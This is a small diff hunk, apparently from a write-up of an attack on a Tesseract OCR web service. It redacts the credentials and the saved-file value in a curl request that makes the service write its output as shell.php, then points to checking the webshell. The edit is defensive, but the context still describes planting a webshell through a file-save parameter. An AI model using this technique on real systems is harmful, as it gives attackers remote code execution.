@@ -456,9 +456,9 @@ The flow is split into two steps: the first request submits the image to Tessera
 ```
 curl -sk \
 -b cookies.txt \
--u walter:miapassword \
+-u w*****:<redacted> \
 -X POST http://localhost:8001 \
--d "ocr_id=ocr_6a5278617ea0c4.38823827&filename=shell.php&save_output=shell.php"
+-d "ocr_id=ocr_6a5278617ea0c4.38823827&filename=shell.php&save_output="
 ```
 Check if the webshell is working:  
 ```
